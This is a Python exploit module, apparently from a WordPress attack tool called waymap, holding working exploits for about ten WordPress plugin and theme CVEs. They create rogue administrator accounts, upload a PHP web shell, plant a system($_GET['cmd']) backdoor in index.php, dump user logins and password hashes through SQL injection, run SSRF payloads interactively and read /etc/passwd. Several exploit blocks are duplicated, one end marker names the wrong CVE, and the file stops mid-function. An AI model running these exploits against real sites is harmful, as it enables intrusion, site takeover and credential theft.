# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# wordpress.py profile critical
from __future__ import unicode_literals
from colorama import Fore, Style, init

# CVE-2022-0441 EXPLOIT STARTS

import re
import requests
init(autoreset=True)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def masterstudy_0441(profile_url, timeout=5):
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

    try:
        response = session.get(url=profile_url, headers=headers, allow_redirects=True, verify=False, timeout=timeout)

        if 'stm_lms_register' in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found!")
            nonce_pattern = re.compile('stm_lms_register":"(.*?)(?:")')
            nonce = nonce_pattern.findall(response.text)[0]

            user_login = "waymaptest"
            user_email = "waymaptestmail@domainexample.com"
            user_password = "waymaptestpass"
            
            data = f'{{"user_login":"{user_login}","user_email":"{user_email}","user_password":"{user_password}","user_password_re":"{user_password}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{{"wp_capabilities":{{"value":{{"administrator":1}}}}}}}}'
            
            exploit_response = session.post(
                url=f'{profile_url}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce=' + nonce, 
                headers=headers, 
                data=data, 
                allow_redirects=True, 
                timeout=timeout
            )
            
            if '"status":"success"' in exploit_response.text and '"message":"' in exploit_response.text:
                print(f"{Style.BRIGHT}{Fore.GREEN}[-] {profile_url}wp-admin/ => Success")
                print(f"{Style.BRIGHT}{Fore.CYAN}[•] Credentials Used:")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Username: {user_login}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Email: {user_email}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Password: {user_password}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Exploit Data: {data}")
                return True 
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[*] {profile_url} => Exploit failed, try manual.")
                return False 
        else:
            print(f"{Style.BRIGHT}{Fore.CYAN}[+] {profile_url} Not vulnerable (stm_lms_register not found).")
            return False  
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[%] {profile_url} => Request failed: {e}")
        return False  

def scan_cve_2022_0441(profile_url):
    success = masterstudy_0441(profile_url)  
    return success 


# CVE-2022-0441 EXPLOIT ENDS

# CVE-2022-0316 EXPLOIT STARTS

from random import getrandbits

vulnerable_paths = [
    "westand", "footysquare", "aidreform", "statfort", "club-theme",
    "kingclub-theme", "spikes", "spikes-black", "soundblast",
    "bolster", "rocky-theme", "bolster-theme", "theme-deejay",
    "snapture", "onelife", "churchlife", "soccer-theme",
    "faith-theme", "statfort-new"
]

shell_code = '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''

def upload_shell_0316(session, profile_url_url, shell_name):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to upload shell to {profile_url_url}...")

        files = {"mofile[]": (shell_name, shell_code)}
        response = session.post(profile_url_url, files=files, verify=False, timeout=30)

        if "New Language Uploaded Successfully" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Shell uploaded successfully!")
            shell_url = profile_url_url.replace("include/lang_upload.php", f"languages/{shell_name}")
            print(f"{Style.BRIGHT}{Fore.CYAN}[•] Shell URL: {shell_url}")
            return shell_url 
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Shell upload failed.")
            return None 
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error uploading shell: {e}")
        return None 

def check_vulnerability_0316(session, profile_url):
    try:
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

        for path in vulnerable_paths:
            test_url = f"{profile_url}/wp-content/themes/{path}/include/lang_upload.php"
            response = session.get(test_url, verify=False, timeout=30)

            if 'Please select Mo file' in response.text:
                print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found: {test_url}")
                return test_url  
            else:
                print(f"{Style.BRIGHT}{Fore.CYAN}[•] Not vulnerable: {test_url}")

        return None  
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error checking vulnerability: {e}")
        return None 

def scan_cve_2022_0316(profile_url):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"})

    profile_url = profile_url.rstrip('/') 
    vulnerable_url = check_vulnerability_0316(session, profile_url)

    if vulnerable_url:
        shell_name = f"{getrandbits(32)}.php"
        shell_url = upload_shell_0316(session, vulnerable_url, shell_name)

        if shell_url:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful! Shell available at: {shell_url}")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. Could not upload shell.")
            return False 
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] No vulnerable endpoints found for {profile_url}.")
        return False  

    return True  


# CVE-2022-0316 EXPLOIT ENDS

# CVE-2022-1386 EXPLOIT STARTS

import binascii
import json
import os
from bs4 import BeautifulSoup


def encode_multipart_form_data_1386(fields):
    boundary = binascii.hexlify(os.urandom(16)).decode('ascii')

    body = (
        "".join("--%s\r\n"
                "Content-Disposition: form-data; name=\"%s\"\r\n"
                "\r\n"
                "%s\r\n" % (boundary, field, value)
                for field, value in fields.items()) +
        "--%s--\r\n" % boundary
    )

    content_type = "multipart/form-data; boundary=%s" % boundary

    return body, content_type


def make_folder_1386(domain):
    os.makedirs("output", exist_ok=True)
    os.makedirs(f"output/{domain}", exist_ok=True)
    return True  


def save_fusion_id_1386(domain, fusion_id):
    with open(f"output/{domain}/fusion_id.txt", "w") as f:
        f.write(fusion_id)
    return True  


def load_fusion_id_1386(domain):
    if os.path.exists(f"output/{domain}/fusion_id.txt"):
        with open(f"output/{domain}/fusion_id.txt", "r") as f:
            return f.read()
    else:
        return None  


def generate_fusion_id_1386(url, domain):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers"
    }
    data = {
        "action": "fusion_form_update_view"
    }
    fusion_id = load_fusion_id_1386(domain)
    if fusion_id is None:
        r = requests.post(url + "/wp-admin/admin-ajax.php", headers=headers, data=data, verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            try:
                fusion_id = soup.find("input", {"name": "fusion-form-nonce-0"})["value"]
                save_fusion_id_1386(domain, fusion_id)
                return fusion_id  
            except TypeError:
                return None  
        else:
            return None  
    else:
        return fusion_id  


def exploit_1386(url, domain, payload, request):
    fusion_id = generate_fusion_id_1386(url, domain)

    if fusion_id is None:
        return {"status": "failed"}  

    data = {
        "formData": f"email=example%40example.com&fusion_privacy_store_ip_ua=false"
                    f"&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
                    f"&fusion-form-nonce-0={fusion_id}&fusion-fields-hold-private-data=",
        "action": "fusion_form_submit_form_to_url",
        "fusion_form_nonce": fusion_id,
        "form_id": "0",
        "post_id": "0",
        "field_labels": '{"email":"Email address"}',
        "hidden_field_names": "[]",
        "fusionAction": payload,
        "fusionActionMethod": "GET"
    }
    encoded_data = encode_multipart_form_data_1386(data)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Content-Type": encoded_data[1]
    }

    r = requests.post(url + "/wp-admin/admin-ajax.php", headers=headers, data=encoded_data[0], verify=False)
    request['request'] = r.request  
    if r.status_code == 200:
        try:
            return r.json()  
        except json.decoder.JSONDecodeError:
            return {"status": "failed"}  
    else:
        return {"status": "failed"}  


def save_raw_request_1386(request, filename):
    headers = [f"{k}: {v}" for k, v in request.headers.items()]
    with open(filename, "w") as f:
        f.write(request.method + " " + request.url + " HTTP/1.1\r\n")
        f.write("\r\n".join(headers))
        f.write("\r\n\r\n")
        f.write(request.body)
    return True  


def run_exploit_1386(profile_url):
    url = profile_url
    domain = url.split("//")[1].split("/")[0]
    make_folder_1386(domain)

    request = {}
    test_url = "https://pastebin.com/raw/XNBxNyaU"
    print("[+] Testing SSRF...")
    result = exploit_1386(url, domain, test_url, request)
    
    if "3e87da640674ddd9c7bafbc1932b91c9" in result.get('info', ''):  
        print("[+] Target is vulnerable to SSRF!")
        print("[+] Saving raw request...")
        save_raw_request_1386(request['request'], f"output/{domain}/raw_request.txt")
        print(f"[+] Raw request saved to output/ folder")

        while True:
            payload = input("[>] Payload: ")
            if payload == "exit":
                break
            print("[+] Sending payload...")
            result = exploit_1386(url, domain, payload, request)
            if result.get('status') == 'success':
                print("[+] Response:")
                print(result['info'])
            else:
                print("[-] Payload is not working!")
                return
    else:
        print("[-] Target is not vulnerable to SSRF!")
        return


# CVE-2022-1386 EXPLOIT ENDS

# CVE-2022-0739 EXPLOIT STARTS



def extract_data_0739(response_body):

    try:
        users = json.loads(response_body)
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting user data from the response...")

        for user in users:
            print(f"{Style.BRIGHT}{Fore.CYAN}Service ID: {user['bookingpress_service_id']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Category ID: {user['bookingpress_category_id']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Service Name: {user['bookingpress_service_name']}")
            print(f"{Style.BRIGHT}{Fore.CYAN}Service Price: {user['bookingpress_service_price']}\n")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error parsing response: {e}")
        return False

def exploit_0739(profile_url):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Performing the SQL injection exploit on {profile_url}...")

    action = "bookingpress_front_get_category_services"
    wp_nonce = get_nonce_0739(profile_url)
    category_id = "33"
    total_service = "-7502"
    sqli = ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -"

    payload = {
        "action": action,
        "_wpnonce": wp_nonce,
        "category_id": category_id,
        "total_service": total_service + sqli
    }

    try:
        response = requests.post(f'{profile_url}/wp-admin/admin-ajax.php', data=payload, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit sent successfully!")

        return response.text
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error sending exploit request: {e}")
        return None

def get_nonce_0739(profile_url):

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Retrieving '_wpnonce' token from {profile_url}...")

    try:
        response = requests.get(f'{profile_url}/events/', headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        response_body = response.text

        match = re.search(r"_wpnonce:'(\w+)'", response_body)
        if match:
            wp_nonce_value = match.group(1)
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] '_wpnonce' token retrieved: {wp_nonce_value}")
            return wp_nonce_value
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] '_wpnonce' not found in the page.")
            return None
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error retrieving '_wpnonce': {e}")
        return None

def scan_cve_2022_0739(profile_url):

    response_body = exploit_0739(profile_url)
    if response_body:
        extract_data_0739(response_body)
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed. No response received.")
        return False


# CVE-2022-0739 EXPLOIT ENDS


# CVE-2022-0441 EXPLOIT STARTS


def masterstudy_0441(profile_url, timeout=5):
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }

    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking {profile_url} for vulnerability...")

    try:
        response = session.get(url=profile_url, headers=headers, allow_redirects=True, verify=False, timeout=timeout)

        if 'stm_lms_register' in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Vulnerable endpoint found!")
            nonce_pattern = re.compile('stm_lms_register":"(.*?)(?:")')
            nonce = nonce_pattern.findall(response.text)[0]

            user_login = "waymaptest"
            user_email = "waymaptestmail@domainexample.com"
            user_password = "waymaptestpass"
            
            data = f'{{"user_login":"{user_login}","user_email":"{user_email}","user_password":"{user_password}","user_password_re":"{user_password}","become_instructor":"","privacy_policy":true,"degree":"","expertize":"","auditory":"","additional":[],"additional_instructors":[],"profile_default_fields_for_register":{{"wp_capabilities":{{"value":{{"administrator":1}}}}}}}}'
            
            exploit_response = session.post(url=f'{profile_url}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce=' + nonce, 
                                            headers=headers, 
                                            data=data, 
                                            allow_redirects=True, 
                                            timeout=timeout)
            
            if '"status":"success"' in exploit_response.text and '"message":"' in exploit_response.text:
                print(f"{Style.BRIGHT}{Fore.GREEN}[-] {profile_url}wp-admin/ => Success")
                print(f"{Style.BRIGHT}{Fore.CYAN}[•] Credentials Used:")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Username: {user_login}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Email: {user_email}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Password: {user_password}")
                print(f"{Style.BRIGHT}{Fore.CYAN}    - Exploit Data: {data}")
                return True 
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[*] {profile_url} => Exploit failed, try manual.")
                return False 
        else:
            print(f"{Style.BRIGHT}{Fore.CYAN}[+] {profile_url} Not vulnerable (stm_lms_register not found).")
            return False  
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[%] {profile_url} => Request failed: {e}")
        return False  

def scan_cve_2022_0441(profile_url):
    success = masterstudy_0441(profile_url)  
    return success  

# CVE-2022-0441 EXPLOIT ENDS

# CVE-2023-28121 EXPLOIT STARTS



def verify_woocommerce_version_28121(profile_url):
    print(Style.RESET_ALL + "Checking WooCommerce Payments version:", end=' ')
    try:
        r = requests.get(f"{profile_url}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except Exception as e:
        print(Fore.RED + f'Error... {e}')
        return False 

    if int(version.replace('.', '')) < 562:
        print(Fore.GREEN + f'{version} Is Vulnerable To CVE-2023-28121 Trying To Create Admin')
        return True  
    else:
        print(Fore.RED + f'{version} - Not vulnerable To CVE-2023-28121')
        return False

def create_waymap_admin_28121(profile_url, username, password, email="admin@waymap.com"):
    headers = {
        'User-Agent': 'Waymap Offensive Agent',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    data = {
        'rest_route': '/wp/v2/users',
        'username': username,
        'email': email,
        'password': password,
        'roles': 'administrator'
    }

    print(Style.RESET_ALL + "Starting session:", end=' ')
    s = requests.Session()
    try:
        r = s.get(f'{profile_url}', headers=headers, verify=False)
        print(Fore.GREEN + 'done')
    except Exception as e:
        print(Fore.RED + f'Error... {e}')
        return False 

    print(Style.RESET_ALL + "Adding Waymap admin user:", end=' ')
    r = s.post(f'{profile_url}', data=data, headers=headers, verify=False)
    if r.status_code == 201:
        print(Fore.GREEN + 'done')
    else:
        print(Fore.RED + f'Cannot Create Waymap Admin Looks Like Target Is Not Vulnerable {r.status_code}')
        return False 

    print(Style.RESET_ALL + "Success! You can now log in with the following credentials:")
    print(f'Username: {username}')
    print(f'Password: {password}')
    print()
    return True 

def main_28121(profile_url):
    username = input("Enter the username to create: ")
    password = input("Enter the password for the new admin user: ")

    if verify_woocommerce_version_28121(profile_url):
        create_waymap_admin_28121(profile_url, username, password)

# CVE-2023-28141 EXPLOIT ENDS

# CVE-2021-24499 EXPLOIT STARTS

class Colors:
    BOLD = '\033[1m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

def check_vulnerability_24499(profile_url):
    shell_path = 'shell.php'
    
    try:
        with open(shell_path, 'rb') as shell_file:
            files = {
                'action': 'workreap_award_temp_file_uploader',
                'award_img': shell_file
            }
            response = requests.post(f"{profile_url}/wp-admin/admin-ajax.php", files=files, verify=False)
            if "File uploaded!" in response.text:
                return True  
            else:
                return False  
    except requests.RequestException as e:
        print(f"{Colors.RED}Error connecting to {profile_url}: {e}{Colors.RESET}")
        return False  
    except IOError as e:
        print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
        return False 

def scan_cve_2021_24499(profile_url):
    print(f"{Colors.BOLD}Checking {profile_url}...{Colors.RESET}")
    if check_vulnerability_24499(profile_url):
        shell_url = f"{profile_url}/wp-content/uploads/workreap-temp/shell.php"
        print(f"{Colors.GREEN}[*] {Colors.BOLD}{profile_url} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
        with open('result.txt', 'a') as result_file:
            result_file.write(f"{shell_url}\n")
        return True 
    else:
        print(f"{Colors.RED}[-] {Colors.BOLD}{profile_url} Not Vulnerable!{Colors.RESET}")
        return False 


# CVE-2021-24499 EXPLOIT ENDS


# CVE-2021-24507 EXPLOIT Starts

session = requests.Session()

def retrieve_nonce_24507(profile_url):
    headers = {
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }
    response = session.get(profile_url, headers=headers, allow_redirects=True, verify=False)
    if 'infinite_nonce' in response.text:
        nonce = re.compile('infinite_nonce":"(.+?)",').findall(str(response.text))[0]
        return nonce, response.url
    else:
        print("Error: Unable to find Nonce.")
        exit()

def submit_request_24507(profile_url, nonce, payload):
    data = {
        "action": "astra_shop_pagination_infinite",
        "page_no": "1",
        "nonce": "{}".format(nonce),
        "query_vars": r'{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["' + payload + r'"]}}}',
        "astra_infinite": "astra_pagination_ajax"
    }
    headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    profile_url += '/wp-admin/admin-ajax.php'
    response = session.post(profile_url, headers=headers, data=data, verify=False)
    return response.text

def assess_sqli_vulnerability_24507(profile_url, nonce):
    response = submit_request_24507(profile_url, nonce, "'")
    if 'database error' in response:
        return True, 'Vulnerable to Error-Based SQL Injection.'
    
    response1 = submit_request_24507(profile_url, nonce, '9656)) and ((7556=1223')
    response2 = submit_request_24507(profile_url, nonce, '9634)) or ((6532=6532')
    if response1 == '' and (len(response2) > len(response1)):
        return True, 'Vulnerable to Boolean-Based SQL Injection.'
    
    return False, 'Not Vulnerable.'

def scan_cve_2021_24507(target):
    nonce, resolved_url = retrieve_nonce_24507(target)
    vulnerability_status = assess_sqli_vulnerability_24507(resolved_url, nonce)
    print(vulnerability_status[1])


# CVE-2021-24507 EXPLOIT ENDS

# CVE-2021-25003 EXPLOIT Starts


def wpcargo_exploit_25003(profile_url, timeout=5):
    payload = 'x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx'
    endpoint = f'wp-content/plugins/wpcargo/includes/barcode.php?text={payload}&sizefactor=.090909090909&size=1&filepath=../../../wp-conf.php'
    session = requests.Session()
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
    }

    try:
        session.get(url=profile_url + endpoint, headers=headers, allow_redirects=True, timeout=timeout, verify=False)
        validation_shell = session.post(url=profile_url + 'wp-content/wp-conf.php?1=system', headers=headers, allow_redirects=True, data={"2": "cat /etc/passwd"}, timeout=timeout, verify=False)

        if 'root:x:0:0:root' in validation_shell.text:
            print(f'[-] Shell successfully uploaded at {profile_url}wp-content/wp-conf.php')
            return True
        else:
            print(f'[+] Shell upload attempt failed at {profile_url}')
            return False
    except Exception as e:
        print(f'[!] Request to {profile_url} failed: {e}')
    return False

def scan_cve_2021_25003(profile_url):
    wpcargo_exploit_25003(profile_url)


# CVE-2021-25003 EXPLOIT ENDS

# CVE-2021-24884 EXPLOIT STARTS

def extract_wp_nonce_24884(profile_url):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting wp_nonce from the theme editor page...")
    editor_url = f"{profile_url}/wp-admin/theme-editor.php?file=index.php"
    
    try:
        response = requests.get(editor_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 200:
            nonce_pattern = re.compile(r'[a-z0-9]{10}')
            matches = nonce_pattern.findall(response.text)
            if len(matches) > 447: 
                wp_nonce = matches[447]
                print(f"{Style.BRIGHT}{Fore.GREEN}[•] Extracted wp_nonce: {wp_nonce}")
                return wp_nonce
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[•] Could not find the wp_nonce.")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to fetch the theme editor page.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error while extracting nonce: {e}")
    
    return None

def modify_index_file_24884(profile_url, wp_nonce):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to modify index.php with RCE payload...")
    
    payload = {
        'nonce': wp_nonce,
        '_wp_http_referer': '/wp-admin/theme-editor.php?file=index.php&theme=twentytwentyone',
        'newcontent': '''<?php
        // RCE Payload to execute system commands
        echo system($_GET['cmd']);
        ?>''',
        'action': 'edit-theme-plugin-file',
        'file': 'index.php',
        'theme': 'twentytwentyone',
        'docs-list': ''
    }
    
    try:
        ajax_url = f"{profile_url}/wp-admin/admin-ajax.php"
        response = requests.post(ajax_url, headers={"User-Agent": "Mozilla/5.0"}, data=payload, verify=False, timeout=30)
        
        if response.status_code == 200 and "true" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Successfully modified index.php with the RCE payload.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to modify index.php.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error during modification attempt: {e}")
        return False

def trigger_rce_24884(profile_url):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering RCE via cmd parameter...")
    
    try:
        rce_url = f"{profile_url}/index.php?cmd=id"
        response = requests.get(rce_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.status_code == 200:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] RCE executed successfully. Output: \n{response.text}")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to trigger RCE.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error triggering RCE: {e}")

def scan_cve_2021_24884(profile_url):
    wp_nonce = extract_wp_nonce_24884(profile_url)
    
    if wp_nonce:
        if modify_index_file_24884(profile_url, wp_nonce):
            trigger_rce_24884(profile_url)
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed.")
            return False  
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Could not extract wp_nonce. Exploit aborted.")
        return False 


# CVE-2021-24884 EXPLOIT ENDS


# CVE-2021-34656 EXPLOIT STARTS

import base64
import hashlib
import time
import urllib.parse


DEFAULT_USER_ID = 1  
COUNT = 5

def generate_auth_url_34656(profile_url, count):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit for {profile_url} with user ID {DEFAULT_USER_ID}...")

    s = int(time.time())
    session = requests.Session()
    
    session.get(f"{profile_url}?wcj_user_id={DEFAULT_USER_ID}", verify=False)

    for i in range(count):
        s = s + i
        s_hash = hashlib.md5(str(s).encode('utf-8')).hexdigest()
        wcj_verify_email_param = base64.b64encode(f'{{"id":"{DEFAULT_USER_ID}","code":"{s_hash}"}}'.encode()).decode('utf-8')
        auth_url = f"{profile_url}?wcj_verify_email={urllib.parse.quote(wcj_verify_email_param)}"
        
        print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Checking: {auth_url}")
        r = session.get(auth_url, allow_redirects=False, verify=False)
        
        print(f"{Style.BRIGHT}{Fore.CYAN}[•] Status Code: {r.status_code}")
        if r.status_code == 302:  
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] ----- Authenticated URL Found ------")
            print(f"{auth_url}")
            print(f"{Style.BRIGHT}{Fore.GREEN}[+] -----------------------------------")
            return True 

    print(f"{Style.BRIGHT}{Fore.RED}[-] Exploit failed or no redirection detected.")
    return False 

def scan_cve_2021_34656(profile_url):
    success = generate_auth_url_34656(profile_url, COUNT)

    if success:
        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful for {profile_url}.")
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed for {profile_url}.")
    
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Exploit finished for {profile_url}.")


# CVE-2021-34656 EXPLOIT ENDS


# CVE-2021-24507 EXPLOIT STARTS


sessionn = requests.Session()

def retrieve_nonce_24507(profile_url):
    headers = {
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close"
    }
    response = sessionn.get(profile_url, headers=headers, allow_redirects=True, verify=False)
    if 'infinite_nonce' in response.text:
        nonce = re.compile('infinite_nonce":"(.+?)",').findall(str(response.text))[0]
        return nonce, response.url
    else:
        print("Error: Unable to find Nonce.")
        exit()

def submit_request_24507(profile_url, nonce, payload):
    data = {
        "action": "astra_shop_pagination_infinite",
        "page_no": "1",
        "nonce": "{}".format(nonce),
        "query_vars": r'{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["' + payload + r'"]}}}',
        "astra_infinite": "astra_pagination_ajax"
    }
    headers = {
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    profile_url += '/wp-admin/admin-ajax.php'
